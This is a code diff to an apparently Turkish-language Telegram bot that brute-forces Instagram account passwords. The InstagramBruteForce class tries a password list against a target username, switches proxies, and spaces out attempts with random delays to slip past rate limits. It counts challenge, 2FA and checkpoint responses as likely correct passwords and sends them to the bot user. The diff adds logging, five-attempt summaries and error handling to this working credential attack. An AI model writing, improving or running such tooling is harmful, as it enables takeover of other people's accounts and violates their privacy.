@@ -382,6 +382,7 @@ class InstagramBruteForce:
         total_passwords = len(password_list)
         potential_passwords = set()
         tried_passwords = 0
+        results = []
         
         try:
             await progress_callback(f"🚀 Instagram Brute Force Başlatılıyor\nHedef: {username}\nŞifre sayısı: {total_passwords}")
@@ -407,9 +408,11 @@ class InstagramBruteForce:
                 if response and response.status_code == 200:
                     try:
                         json_data = response.json()
+                        logger.debug(f"API Yanıtı ({password}): {json_data}")
                         if 'challenge_required' in json_data or json_data.get('message') == 'challenge_required':
                             result = "CHALLENGE_REQUIRED"
                             potential_passwords.add(password)
+                            logger.info(f"Potansiyel şifre eklendi: {password} (CHALLENGE_REQUIRED)")
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🚧 Challenge required! Şifre doğru olabilir: {password}. Proxy değiştiriliyor...")
                             self.current_proxy = self._get_working_proxy(progress_callback)
@@ -429,30 +432,39 @@ class InstagramBruteForce:
                         elif json_data.get('two_factor_required'):
                             result = "2FA"
                             potential_passwords.add(password)
+                            logger.info(f"Potansiyel şifre eklendi: {password} (2FA)")
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                             return password
                         elif json_data.get('checkpoint_url'):
                             result = "CHECKPOINT"
                             potential_passwords.add(password)
+                            logger.info(f"Potansiyel şifre eklendi: {password} (CHECKPOINT)")
                             await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                             await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                             return password
                         else:
                             result = "UNKNOWN"
                             potential_passwords.add(password)
+                            logger.warning(f"Bilinmeyen yanıt formatı: {json_data}")
                     except json.JSONDecodeError:
                         result = "ERROR"
                         potential_passwords.add(password)
+                        logger.error(f"JSON decode hatası: {response.text}")
                 
+                results.append(result)
                 await progress_callback(f"🔐 Şifre deneniyor ({i+1}/{total_passwords}): {password} - {result}")
                 
                 tried_passwords += 1
                 
                 if (i + 1) % 5 == 0:
+                    summary = f"📊 Son 5 şifre durumu:\n"
+                    for j in range(max(0, i-4), i+1):
+                        summary += f"Şifre {j+1}: {password_list[j]} - {results[j]}\n"
+                    await progress_callback(summary)
                     await self._get_initial_cookies_and_tokens(progress_callback)
                 
-                delay = random.uniform(20, 40)
+                delay = random.uniform(30, 60)
                 await asyncio.sleep(delay)
             
             report = f"📊 Rapor:\nDenenen şifre: {tried_passwords}/{total_passwords}"
@@ -465,8 +477,7 @@ class InstagramBruteForce:
                         [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
                     ]
                     reply_markup = InlineKeyboardMarkup(keyboard)
-                    context.user_data['potential_passwords'] = list(potential_passwords)
-                    context.user_data['username'] = username
+                    logger.info("Tekrar Dene butonu gönderiliyor...")
                     await progress_callback("🔄 Bu şifreler doğru olabilir. Tekrar denemek ister misiniz?", reply_markup=reply_markup)
                 return None
             else:
@@ -723,6 +734,11 @@ class TelegramBot:
         async def progress_callback(message, reply_markup=None):
             try:
                 await query.message.reply_text(message, reply_markup=reply_markup)
+                logger.info(f"Mesaj gönderildi: {message}")
+                await asyncio.sleep(0.5)  # Kısa bir gecikme
+            except TelegramError as e:
+                logger.error(f"Telegram hatası: {e}")
+                await query.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
             except Exception as e:
                 logger.error(f"Progress callback error: {e}")
         
@@ -754,6 +770,7 @@ class TelegramBot:
             await query.message.reply_text("❌ Tekrar denenecek şifre bulunamadı!")
             return
         
+        logger.info(f"Tekrar deneniyor: {username} için {len(potential_passwords)} şifre")
         await query.message.reply_text(f"🔄 Potansiyel şifreler tekrar deneniyor...\nHedef: {username}\nŞifre sayısı: {len(potential_passwords)}")
         
         instagram_brute = InstagramBruteForce()
@@ -761,6 +778,11 @@ class TelegramBot:
         async def progress_callback(message, reply_markup=None):
             try:
                 await query.message.reply_text(message, reply_markup=reply_markup)
+                logger.info(f"Mesaj gönderildi: {message}")
+                await asyncio.sleep(0.5)  # Kısa bir gecikme
+            except TelegramError as e:
+                logger.error(f"Telegram hatası: {e}")
+                await query.message.reply_text(f"⚠️ Telegram hatası: {str(e)}")
             except Exception as e:
                 logger.error(f"Progress callback error: {e}")
         
@@ -775,6 +797,8 @@ class TelegramBot:
             await query.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {result}")
             context.user_data.pop('potential_passwords', None)
             context.user_data.pop('username', None)
+        else:
+            await query.message.reply_text("❌ Tekrar denemede şifre bulunamadı.")
 
 def main():
     application = Application.builder().token(TOKEN).build()
@@ -793,4 +817,3 @@ def main():
 
 if __name__ == '__main__':
     main()
-
